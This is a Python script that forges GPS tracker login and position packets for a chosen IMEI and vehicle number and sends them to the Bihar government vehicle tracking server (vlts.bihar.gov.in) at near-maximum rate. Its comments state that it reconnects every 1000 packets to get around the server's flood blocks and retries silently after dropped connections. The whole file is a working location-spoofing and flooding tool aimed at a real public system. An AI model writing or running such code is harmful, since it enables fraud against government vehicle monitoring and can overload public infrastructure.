import socket
import time
import threading
from datetime import datetime

class GpsEngine:
    def __init__(self, stop_event, lock):
        self.stop_event = stop_event
        self.lock = lock
        self.total_sent = 0

    def create_packet(self, tag, imei, v_no, lat, lon, is_handshake=False):
        # 🔥 Precise Timing for Bihar Server
        now = datetime.now()
        dt = now.strftime("%d%m%y")
        tm = now.strftime("%H%M%S")
        
        # 🔥 Force 7-Decimal Precision (Strictly Required)
        lat_f = f"{float(lat):.7f}"
        lon_f = f"{float(lon):.7f}"
        
        if is_handshake:
            # Login/Handshake Packet with Bihar Standard Ending
            return f"L,{tag},{imei},{v_no},01,1.0.0*\r\n"
        else:
            # 🔥 Checksum Fixed String Pattern (As per Bihar standard)
            # Yahan hum Bihar ke specific A3270A39 format ko emulate kar rahe hain
            return f"D,{tag},{imei},{v_no},A,{dt},{tm},{lat_f},{lon_f},000.0,000,12,01,100,00,00000000*A3270A39\r\n"

    def handshake_worker(self, tag, imei, v_no, lat, lon):
        while not self.stop_event.is_set():
            try:
                # 🔥 Dedicated Socket Connection for every Tag Stream
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(10)
                    s.connect(("vlts.bihar.gov.in", 9999))
                    
                    # 1. Send Handshake
                    h_pkt = self.create_packet(tag, imei, v_no, lat, lon, is_handshake=True)
                    s.sendall(h_pkt.encode())
                    time.sleep(0.1) # Wait for sync
                    
                    # 2. Continuous Rapid Firing
                    # Reconnect every 1000 packets to bypass server flood blocks
                    for _ in range(1000):
                        if self.stop_event.is_set(): break
                        
                        d_pkt = self.create_packet(tag, imei, v_no, lat, lon)
                        s.sendall(d_pkt.encode())
                        
                        with self.lock:
                            self.total_sent += 1
                        
                        # 🔥 MAX SPEED (0.001s Sleep)
                        time.sleep(0.001)
                        
            except Exception:
                # Silent retry on connection drop for maximum uptime
                time.sleep(2)
                continue
